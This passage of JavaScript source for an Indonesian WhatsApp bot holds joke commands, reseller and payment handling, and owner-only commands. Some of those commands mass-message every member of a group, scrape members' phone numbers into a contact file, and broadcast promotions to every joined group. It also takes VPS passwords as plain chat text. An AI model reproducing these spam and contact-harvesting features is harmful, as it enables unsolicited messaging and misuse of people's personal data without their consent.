    "*Agama : Katolik*",
    "*Agama : Penyembah Patung 😂*",    
];
let pickRandom = (list) => list[Math.floor(Math.random() * list.length)];
let khodam = pickRandom(khodamList);
let name = await conn.getName(who);
Reply(`*🚀 Hasil Pencarian Agama*\n--------------------------------------------------------------\n- *Nama : ${text}*\n- ${khodam}\n\n> © Simple Bot V4 Update`, { mentions: [who] });
    }
        break;

case "cekkhodam": {
if (!text) return m.reply(example("nama"))
let who = m.mentionedJid[0] 
? m.mentionedJid[0] 
: m.quoted 
? m.quoted.sender 
: m.sender;
let khodamList = [
    "*Khodam : Harimau Bangkit*",
    "*Khodam : Macan Terbang*",
    "*Khodam : Singa Perkasa*",
    "*Khodam : Naga Tersembunyi*",
    "*Khodam : Garuda Perkasa*",
    "*Khodam : Phoenix Bersinar*",
    "*Khodam : Unicorn Gemilang*",
    "*Khodam : Griffin Terbang*",
    "*Khodam : Pegasus Terbang*",
    "*Khodam : Sphinx Tertawa*",
    "*Khodam : Centaur Cerdik*",
    "*Khodam : Feniks Agung*",
    "*Khodam : Cerberus Setia*",
    "*Khodam : Hydra Kekal*",
    "*Khodam : Dragon Naga*",
    "*Khodam : Basilisk Beracun*",
    "*Khodam : Minotaur Kuat*",
    "*Khodam :  Yeti Es*",
    "*Khodam :  Bigfoot Misterius*",
    "*Khodam : Kraken Lautan*",
    "*Khodam :  Chupacabra Tersembunyi*",
    "*Khodam : Wendigo Kedinginan*",
    "*Khodam : Kitsune Ceria*",
    "*Khodam : Tanuki Pintar*",
    "*Khodam : Kappa Berair*",
    "*Khodam : Tengu Angin*",
    "*Khodam : Oni Berkepala Tiga*",
    "*Khodam : Raiju Petir*",
    "*Khodam : Kamaitachi Taji*",
    "*Khodam : Bakeneko Licik*",
    "*Khodam : Nue Transformasi*",
    "*Khodam : Komainu Setia*",
    "*Khodam : Kirin Berkilau*",
    "*Khodam : Tsuchigumo Laba-laba*",
    "*Khodam : Jorogumo Cantik*",
    "*Khodam : Tanuki Gemuk*",
    "*Khodam : Okami Suci*",
    "*Khodam : Inugami Setia*",
    "*Khodam : Tanuki Mencuri*",
    "*Khodam : Noppera-bo Wajah Kosong*",
    "*Khodam : Abumi-guchi Pengerat*",
    "*Khodam : Aka Manto Merah*",
    "*Khodam : Ashiarai Yashiki Kaki Raksasa*",
    "*Khodam : Bake-kujira Paus Hantu*",
    "*Khodam : Buruburu Gemetar*",
    "*Khodam : Dorotabo Tani Menyusup*",
    "*Khodam : Funayurei Hantu Laut*",
    "*Khodam : Gasha-dokuro Tengkorak Raksasa*",
    "*Khodam : Hanako-san Toilet*",
    "*Khodam : Hitodama Api Terbang*",
    "*Khodam : Ikiryo Semangat Terpisah*",
    "*Khodam : Jinmenju Pohon Wajah*",
    "*Khodam : Jubokko Pohon Darah*",
    "*Khodam : Kamikiri Seringai*",
    "*Khodam : Kawa-no-kami Dewa Sungai*",
    "*Khodam : Kuchisake-onna Wanita Bermulut Potong*",
    "*Khodam : Mokumokuren Mata Banyak*",
    "*Khodam : Mujina Pemalu*",
    "*Khodam : Namahage Setan Pengusir*",
    "*Khodam : Nurarihyon Kepala Hijau*",
    "*Khodam : Noppera-bo Wajah Kosong*",
    "*Khodam : Nue Transformasi*",
    "*Khodam : Nuppeppo Lempung Gemuk*",
    "*Khodam : Nurarihyon Kepala Hijau*",
    "*Khodam : Oboroguruma Kereta Hantu*",
    "*Khodam : Odoro-odoro Odoro-odoro*",
    "*Khodam : Ohaguro-bettari Pahatan Gigi Hitam*",
    "*Khodam : Okiku Ningyou Boneka*",
    "*Khodam : Oshiroi Baba Nyonya Berpakaian Putih*",
    "*Khodam : Rokuro-kubi Kepala Terpisah*",
    "*Khodam : Satori Pemikiran*",
    "*Khodam : Shichinin Misaki Pengganggu*",
    "*Khodam : Shikigami Hantu Tertawa*",
    "*Khodam : Tanuki Menjadi Diri Sendiri*",
    "*Khodam : Tengu Berburu*",
    "*Khodam : Tsuchigumo Laba-laba*",
    "*Khodam : Umibozu Perompak Lautan*",
    "*Khodam : Wanyuudou Roda Hantu*",
    "*Khodam : Yama-uba Raksasa Gunung*",
    "*Khodam : Yurei Hantu Sedih*",
    "*Khodam : Zashiki-warashi Setan Kecil*",
    "*Khodam : Yama-uba Raksasa Gunung*",
    "*Khodam : Nurarihyon Kepala Hijau*",
    "*Khodam : Noppera-bo Wajah Kosong*",
    "*Khodam : Nue Transformasi*",
    "*Khodam : Nuppeppo Lempung Gemuk*",
    "*Khodam : Nurarihyon Kepala Hijau*",
    "*Khodam : Oboroguruma Kereta Hantu*",
    "*Khodam : Odoro-odoro Odoro-odoro*",
    "*Khodam : Ohaguro-bettari Pahatan Gigi Hitam*",
    "*Khodam : Okiku Ningyou Boneka*",
    "*Khodam : Oshiroi Baba Nyonya Berpakaian Putih*",
    "*Khodam : Rokuro-kubi Kepala Terpisah*",
    "*Khodam : Satori Pemikiran*",
    "*Khodam : Shichinin Misaki Pengganggu*",
    "*Khodam : Shikigami Hantu Tertawa*",
    "*Khodam : Tanuki Menjadi Diri Sendiri*",
    "*Khodam : Tengu Berburu*",
    "*Khodam : Tsuchigumo Laba-laba*",
    "*Khodam : Umibozu Perompak Lautan*",
    "*Khodam : Wanyuudou Roda Hantu*",
    "*Khodam : Yama-uba Raksasa Gunung*",
    "*Khodam : Yurei Hantu Sedih*",
    "*Khodam : Zashiki-warashi Setan Kecil*",
];
let pickRandom = (list) => list[Math.floor(Math.random() * list.length)];
let khodam = pickRandom(khodamList);
let name = await conn.getName(who);
Reply(`*🚀 Hasil Pencarian Khodam*\n--------------------------------------------------------------\n- *Nama : ${text}*\n- ${khodam}\n\n> © Simple Bot V4 Update`, { mentions: [who] });
    }
        break;
        
        case "pushkontak2": {
if (!isOwner) return m.reply(mess.owner)
if (!m.isGroup) return m.reply(mess.group)
if (!text) return m.reply(example("pesannya"))
const teks = text
const jidawal = m.chat
const data = await conn.groupMetadata(m.chat)
const halls = await data.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
await m.reply(`Memproses *pushkontak*`)
for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
const vcard = 'BEGIN:VCARD\n'
+ 'VERSION:3.0\n' 
+ `FN:${namaOwner}\n`
+ 'ORG:Developer;\n'
+ `TEL;type=CELL;type=VOICE;waid=${global.owner}:${global.owner}\n`
+ 'END:VCARD'
const sentMsg= await conn.sendMessage(mem, { contacts: { displayName: namaOwner, contacts: [{ vcard }] }})
await conn.sendMessage(mem, {text: teks}, {quoted: sentMsg })
await sleep(global.delayPushkontak)
}}

await conn.sendMessage(jidawal, {text: `*Berhasil Pushkontak ✅*\nTotal member berhasil dikirim pesan : ${halls.length}`}, {quoted: qtext})
}
break

case "savekontak": {
if (!isOwner) return Reply(mess.owner)
if (!text) return m.reply(example("idgrupnya"))
let res = await conn.groupMetadata(text)
const halls = await res.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
contacts.push(mem)
fs.writeFileSync('./library/database/contacts.json', JSON.stringify(contacts))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:Buyer Danz - ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./library/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`*Berhasil membuat file kontak ✅*
File kontak telah dikirim ke private chat
Total *${halls.length}* kontak`)
await conn.sendMessage(m.sender, { document: fs.readFileSync("./library/database/contacts.vcf"), fileName: "contacts.vcf", caption: `File kontak berhasil dibuat ✅\nTotal *${halls.length}* kontak`, mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./library/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./library/database/contacts.vcf", "")
}}
break
//================================================================================

case "savekontak2": {
if (!isOwner) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
let res = await m.metadata
const halls = await res.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
contacts.push(mem)
fs.writeFileSync('./library/database/contacts.json', JSON.stringify(contacts))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:Buyer Danz - ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./library/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`*Berhasil membuat file kontak ✅*
File kontak telah dikirim ke private chat
Total *${halls.length}* kontak`)
await conn.sendMessage(m.sender, { document: fs.readFileSync("./library/database/contacts.vcf"), fileName: "contacts.vcf", caption: `File kontak berhasil dibuat ✅\nTotal *${halls.length}* kontak`, mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./library/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./library/database/contacts.vcf", "")
}}
break

//================================================================================

case "pushkontak": {
if (!isOwner) return m.reply(mess.owner)
if (!text) return m.reply(example("idgrup|pesannya"))

const parts = text.split("|")
if (parts.length !== 2) return m.reply(example("idgrup|pesannya"))

const [idgc, pes] = parts
const teks = pes
const jidawal = m.chat

try {
const data = await conn.groupMetadata(idgc)
const halls = await data.participants
.filter(v => 
v.id.endsWith('.net') && 
v.id !== botNumber && 
v.id.split("@")[0] !== global.owner
)
.map(v => v.id)

 await m.reply(`Memproses *pushkontak* ke dalam grup *${data.subject}*`)

 for (let mem of halls) {
const vcard = 'BEGIN:VCARD\n'
+ 'VERSION:3.0\n' 
+ `FN:${namaOwner}\n`
+ 'ORG:Developer;\n'
+ `TEL;type=CELL;type=VOICE;waid=${global.owner}:${global.owner}\n`
+ 'END:VCARD'

const sentMsg = await conn.sendMessage(mem, { 
contacts: { 
 displayName: namaOwner, 
 contacts: [{ vcard }] 
}
})

await conn.sendMessage(mem, { text: teks }, { quoted: sentMsg })
await sleep(global.delayPushkontak)
 }

 await conn.sendMessage(jidawal, {
text: `*Berhasil Pushkontak ✅*\nTotal member berhasil dikirim pesan : ${halls.length}`
 }, { quoted: m })

} catch (error) {
 console.error("Error in pushkontak:", error)
 await m.reply("Terjadi kesalahan saat memproses pushkontak")
}
}
break

case "apkmod": {
if (!text) return m.reply(example("capcut"))
await fetchJson(`https://restapi-v2.simplebot.my.id/search/happymod?q=${text}`).then((res) => {
let teks = ""
for (let i of res.result) {
teks += `\n* *Nama Apk :* ${i.name}
* *Link Download:* ${i.url}\n`
}
m.reply(teks)
conn.sendMessage(m.chat, {react: {text: '', key: m.key}})
}).catch(e => m.reply("Error"))
}
break

case "jpmslide": {
if (!isCreator) return Reply(mess.owner)
let allgrup = await conn.groupFetchAllParticipating()
let res = await Object.keys(allgrup)
let count = 0
const jid = m.chat
await m.reply(`Memproses *jpmslide* Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await slideButton(i)
count += 1
} catch {}
await sleep(global.delayJpm)
}
await conn.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: qtext})
}
break

//================================================================================

case "jpmslidehidetag": case "jpmslideht": {
if (!isCreator) return Reply(mess.owner)
let allgrup = await conn.groupFetchAllParticipating()
let res = await Object.keys(allgrup)
let count = 0
const jid = m.chat
await m.reply(`Memproses *jpmslide hidetag* Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await slideButton(i, allgrup[i].participants.map(e => e.id))
count += 1
} catch {}
await sleep(global.delayJpm)
}
await conn.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: qtext})
}
break

//================================================================================

case "jpmch2": {
    if (!isCreator) return m.reply(mess.owner);
    if (!text) return m.reply("*Contoh Penggunaan :*\n Ketik .jpmch2 teks dengan mengirim foto");
    if (!/image/.test(mime)) return m.reply(example(""))
    
    let image = await conn.downloadAndSaveMediaMessage(qmsg);
    const daftarSaluran = [
        "120363302487858524@newsletter",
        "120363351011392141@newsletter",
    ];
    let total = 0;

    m.reply(`Memproses Mengirim Pesan Teks & Foto Ke ${daftarSaluran.length} Saluran...`);
    
    for (const idSaluran of daftarSaluran) {
        try {
            await conn.sendMessage(idSaluran, {
                image: await fs.readFileSync(image),
                caption: text,
                contextInfo: { forwardingScore: 1, isForwarded: true },
            });
            total++;
        } catch (err) {
            console.error(`Gagal mengirim ke saluran ${idSaluran}:`, err);
        }
        await sleep(global.delayJpm); // Delay antara pesan
    }

    await fs.unlinkSync(image);
    m.reply(`Berhasil Mengirim Pesan Ke ${total} Saluran`);
}
break

//================================================================================

case "jpm": {
if (!isCreator) return Reply(mess.owner)
if (!q) return m.reply(example("teksnya"))
let allgrup = await conn.groupFetchAllParticipating()
let res = await Object.keys(allgrup)
let count = 0
const jid = m.chat
const teks = text
await m.reply(`Memproses *jpm* teks Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await conn.sendMessage(i, {text: `${teks}`}, {quoted: qlocJpm})
count += 1
} catch {}
await sleep(global.delayJpm)
}
await conn.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: qtext})
}
break

//================================================================================

case "jpm2": {
if (!isCreator) return Reply(mess.owner)
if (!q) return m.reply(example("teks dengan mengirim foto"))
if (!/image/.test(mime)) return m.reply(example("teks dengan mengirim foto"))
const allgrup = await conn.groupFetchAllParticipating()
const res = await Object.keys(allgrup)
let count = 0
const teks = text
const jid = m.chat
const rest = await conn.downloadAndSaveMediaMessage(qmsg)
await m.reply(`Memproses *jpm* teks & foto Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await conn.sendMessage(i, {image: fs.readFileSync(rest), caption: teks}, {quoted: qlocJpm})
count += 1
} catch {}
await sleep(global.delayJpm)
}
await fs.unlinkSync(rest)
await conn.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: qtext})
}
break

//================================================================================

case "jpm3": {
    if (!isCreator) return Reply(mess.owner);
    if (!q) return m.reply(example("*teks dengan mengirim video*"));
    if (!/video/.test(mime)) return m.reply(example("teks dengan mengirim video"));
    
    const allgrup = await conn.groupFetchAllParticipating();
    const res = await Object.keys(allgrup);
    let count = 0;
    const teks = text;
    const jid = m.chat;
    const rest = await conn.downloadAndSaveMediaMessage(qmsg);
    
    await m.reply(`*Memproses jpm teks & video ke ${res.length} grup*`);
    
    for (let i of res) {
        // Lewati grup yang ada dalam daftar blacklist
        if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue;
        try {
            // Kirim video dengan caption
            await conn.sendMessage(i, { video: fs.readFileSync(rest), caption: teks }, { quoted: qlocJpm });
            count += 1;
        } catch {}
        await sleep(global.delayJpm); // Beri jeda pengiriman antar grup
    }
    
    await fs.unlinkSync(rest); // Hapus file sementara setelah selesai
    await conn.sendMessage(jid, { text: `*JPM Sukses dikirim*\n*Total grup yang berhasil dikirim pesan : ${count}*` }, { quoted: m });
}
break;

//================================================================================

case "jpmtesti": {
if (!isCreator) return Reply(mess.owner)
if (!q) return m.reply(example("teks dengan mengirim foto"))
if (!/image/.test(mime)) return m.reply(example("teks dengan mengirim foto"))
const allgrup = await conn.groupFetchAllParticipating()
const res = await Object.keys(allgrup)
let count = 0
const teks = text
const jid = m.chat
const rest = await Sky.downloadAndSaveMediaMessage(qmsg)
await m.reply(`Memproses *jpm* testimoni Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await conn.sendMessage(i, {image: await fs.readFileSync(rest), caption: teks, contextInfo: { isForwarded: true, mentionedJid: [m.sender], businessMessageForwardInfo: { businessOwnerJid: global.owner+"@s.whatsapp.net" }, forwardedNewsletterMessageInfo: { newsletterName: global.namaSaluran, newsletterJid: global.idSaluran }}}, {quoted: qlocJpm})
count += 1
} catch {}
await sleep(global.delayJpm)
}
await fs.unlinkSync(rest)
await conn.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: qtext})
}
break

case "addseller": {
if (!isCreator) return Reply(mess.owner)
if (!text && !m.quoted) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || premium.includes(input) || input === botNumber) return m.reply(`Nomor ${input2} sudah menjadi reseller!`)
premium.push(input)
await fs.writeFileSync("./library/database/premium.json", JSON.stringify(premium, null, 2))
m.reply(`Berhasil menambah reseller ✅`)
}
break

case "listseller": {
if (premium.length < 1) return m.reply("Tidak ada user reseller")
let teks = `\n *乂 List all reseller panel*\n`
for (let i of premium) {
teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
}
Sky.sendMessage(m.chat, {text: teks, mentions: premium}, {quoted: qtext})
}
break

//================================================================================

case "delseller": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted && !text) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 == global.owner || input == botNumber) return m.reply(`Tidak bisa menghapus owner!`)
if (!premium.includes(input)) return m.reply(`Nomor ${input2} bukan reseller!`)
let posi = premium.indexOf(input)
await premium.splice(posi, 1)
await fs.writeFileSync("./library/database/premium.json", JSON.stringify(premium, null, 2))
m.reply(`Berhasil menghapus reseller ✅`)
}
break

case "addowner": case "addown": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted && !text) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || owners.includes(input) || input === botNumber) return m.reply(`Nomor ${input2} sudah menjadi owner bot!`)
owners.push(input)
await fs.writeFileSync("./library/database/owner.json", JSON.stringify(owners, null, 2))
m.reply(`Berhasil menambah owner ✅`)
}
break

case "delowner": case "delown": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted && !text) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || input == botNumber) return m.reply(`Tidak bisa menghapus owner utama!`)
if (!owners.includes(input)) return m.reply(`Nomor ${input2} bukan owner bot!`)
let posi = owners.indexOf(input)
await owners.splice(posi, 1)
await fs.writeFileSync("./library/database/owner.json", JSON.stringify(owners, null, 2))
m.reply(`Berhasil menghapus owner ✅`)
}
break

case "pay": case "payment": case "qris": {
await conn.sendMessage(m.chat, {
  footer: `© WhatsApp Botz - 2025`,
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Payment Lain',
          sections: [
            {
              title: 'List Payment',
              rows: [
                {
                  title: 'DANA',
                  id: '.dana'
                },
                {
                  title: 'OVO',
                  id: '.ovo'
                },                
                {
                  title: 'GOPAY',
                  id: '.gopay'
                }
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: "https://files.catbox.moe/861hph.jpg"}, 
  caption: "\n```Scan qris diatas dan jika sudah transfer mohon sertakan bukti```\n"
}, {quoted: qtext2})
}
break

case "dana": {
if (!isCreator) return
let teks = `
*PAYMENT DANA ${global.namaOwner.toUpperCase()}*

* *Nomor :* ${global.dana}

*[ ! ] Penting :* \`\`\`Wajib kirimkan bukti transfer demi keamanan bersama\`\`\`
`
await conn.sendMessage(m.chat, {text: teks}, {quoted: qtext2})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "ovo": {
if (!isCreator) return
let teks = `
*PAYMENT OVO ${global.namaOwner.toUpperCase()}*

* *Nomor :* ${global.ovo}

*[ ! ] Penting :* \`\`\`Wajib kirimkan bukti transfer demi keamanan bersama\`\`\`
`
await conn.sendMessage(m.chat, {text: teks}, {quoted: qtext2})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "gopay": {
if (!isCreator) return
let teks = `
*PAYMENT GOPAY ${global.namaOwner.toUpperCase()}*

* *Nomor :* ${global.gopay}

*[ ! ] Penting :* \`\`\`Wajib kirimkan bukti transfer demi keamanan bersama\`\`\`
`
await conn.sendMessage(m.chat, {text: teks}, {quoted: qtext2})
}
break

case "proses": {
if (!isCreator) return Reply(mess.owner)
if (!q) return m.reply(example("jasa install panel"))
let teks = `📦 ${text}
⏰ ${tanggal(Date.now())}

*Testimoni :*
${linkSaluran}

*Marketplace :*
${linkGrup}`
await conn.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
externalAdReply: {
title: `Dana Masuk ✅`, 
body: `© Powered By ${namaOwner}`, 
thumbnailUrl: global.image.reply, 
sourceUrl: linkSaluran,
}}}, {quoted: null})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "done": {
if (!isCreator) return Reply(mess.owner)
if (!q) return m.reply(example("jasa install panel"))
let teks = `📦 ${text}
⏰ ${tanggal(Date.now())}

*Testimoni :*
${linkSaluran}

*Marketplace :*
${linkGrup}`
await conn.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
externalAdReply: {
title: `Transaksi Done ✅`, 
body: `© Powered By ${namaOwner}`, 
thumbnailUrl: global.image.reply, 
sourceUrl: linkSaluran,
}}}, {quoted: null})
}
break

case "developerbot": case "owner": {
await conn.sendContact(m.chat, [global.owner], m)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "save": case "sv": {
if (!isCreator) return
await conn.sendContact(m.chat, [m.chat.split("@")[0]], m)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "self": {
if (!isCreator) return
conn.public = false
m.reply("Berhasil mengganti ke mode *self*")
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "getcase": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("menu"))
const getcase = (cases) => {
return "case "+`\"${cases}\"`+fs.readFileSync('./ZarStore.js').toString().split('case \"'+cases+'\"')[1].split("break")[0]+"break"
}
try {
m.reply(`${getcase(q)}`)
} catch (e) {
return m.reply(`Case *${text}* tidak ditemukan`)
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'addatabase': 
        if (!isCreator) return Reply(`*khusus Premium*`);
            if (!q) return Reply(`Penggunaan .${command} 6288804148639`)
            await adddatabase(q)
break;

case 'deldatabase': {
    if (!isCreator) return Reply(`*Khusus Premium*`);
    if (!q) return Reply(`Penggunaan: .${command} 6288804148639`);

    let result = await deleteFromDatabase(q);
    return Reply(result.message);
}
break;

case "ping": case "uptime": {
let timestamp = speed();
let latensi = speed() - timestamp;
let tio = await nou.os.oos();
var tot = await nou.drive.info();
let respon = `
*🔴 INFORMATION SERVER*

*⳺ Platform :* ${nou.os.type()}
*⳺ Total Ram :* ${formatp(os.totalmem())}
*⳺ Total Disk :* ${tot.totalGb} GB
*⳺ Total Cpu :* ${os.cpus().length} Core
*⳺ Runtime Vps :* ${runtime(os.uptime())}

*🔵 INFORMATION BOTZ*

*⳺ Respon Speed :* ${latensi.toFixed(4)} detik
*⳺ Runtime Bot :* ${runtime(process.uptime())}
`
await m.reply(respon)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "ip": {
if (!isCreator) return
let t = await fetchJson('https://api64.ipify.org?format=json')
m.reply(`IP Panel : ${t.ip}`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "public": {
if (!isCreator) return
conn.public = true
m.reply("Berhasil mengganti ke mode *public*")
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "restart": case "rst": {
if (!isCreator) return Reply(mess.owner)
await m.reply("Memproses _restart server_ . . .")
var file = await fs.readdirSync("./session")
var anu = await file.filter(i => i !== "creds.json")
for (let t of anu) {
await fs.unlinkSync(`./session/${t}`)
}
await process.send('reset')
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "upchannel": case "upch": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("teksnya bisa dengan kirim foto"))
let res
if (/image/.test(mime)) res = await conn.downloadAndSaveMediaMessage(qmsg)
let content = res !== undefined ? { image: {url: res}, caption: text } : { text: text }
await conn.sendMessage(idSaluran, content)
m.reply("Berhasil mengirim pesan ke dalam channel whatsapp")
if (res !== undefined) await fs.unlinkSync(res)
}
break

case "upchannel2": case "upch2": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("teksnya dengan mengirim foto"))
if (!/image/.test(mime)) return m.reply(example("teksnya dengan mengirim foto"))
let img = await conn.downloadAndSaveMediaMessage(qmsg)
await conn.sendMessage(idSaluran, {image: await fs.readFileSync(img), caption: text})
m.reply("Berhasil mengirim pesan *teks & foto* ke dalam channel whatsapp")
await fs.unlinkSync(img)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "upswtag": {
if (!isOwner) return Reply(mess.owner)
if (!text) return m.reply(example("text & bisa dengan kirim foto"))
if (/image/.test(mime)) global.imgsw = qmsg
const meta = await conn.groupFetchAllParticipating()
let dom = await Object.keys(meta)
global.textupsw = text
let list = []
for (let i of dom) {
await list.push({
title: meta[i].subject, 
id: `.create-storywa ${i}|${meta[i].subject}`, 
description: `${meta[i].participants.length} Member`
})
}
return conn.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Grup',
          sections: [
            {
              title: 'List Grup Chat',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© WhatsApp Bots - 2025`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Target Grup Tag\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m}) 
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "create-storywa": {
if (!isCreator) return Reply(mess.owner)
if (global.textupsw == undefined) return

async function mentionStatus(jids, content) {
    let colors = ['#7ACAA7', '#6E257E', '#5796FF', '#7E90A4', '#736769', '#57C9FF', '#25C3DC', '#FF7B6C', '#55C265', '#FF898B', '#8C6991', '#C69FCC', '#B8B226', '#EFB32F', '#AD8774', '#792139', '#C1A03F', '#8FA842', '#A52C71', '#8394CA', '#243640'];
    let fonts = [0];
    let user = await conn.groupMetadata(jids)
    let users = user.participants.map(v => v.id)

    let message = await conn.sendMessage(
        "status@broadcast", 
        content, 
        {
            backgroundColor: colors[Math.floor(Math.random() * colors.length)], 
            font: fonts[Math.floor(Math.random() * fonts.length)], 
            statusJidList: users, 
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [{
                                tag: "to",
                                attrs: { jid: jids },
                                content: undefined,
                            }]
                        },
                    ],
                },
            ],
        }
    );
        await conn.relayMessage(
            jids, 
            {
                groupStatusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: message.key,
                            type: 25,
                        },
                    },
                },
            },
            {
                userJid: conn.user.jid,
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "true" },
                        content: undefined,
                    },
                ],
            }
        )
}

const teks = global.textupsw
let jid = text.split("|")[0]
let nama = text.split("|")[1]

if (global.imgsw !== undefined) {
media = await conn.downloadAndSaveMediaMessage(global.imgsw)
await mentionStatus(jid, {
  image: { url: media }, 
  caption: teks
});
await fs.unlinkSync(media)
} else {
await mentionStatus(jid, {
  text: teks
});
}
return m.reply(`Berhasil membuat status tag grup ${nama}`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "installtema": case "installthema": {
if (!isCreator) return m.reply(mess.owner)
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return m.reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}
let teksnya = `\nPilih Jenis Tema Yang Tersedia`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessageV2Extension: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender]
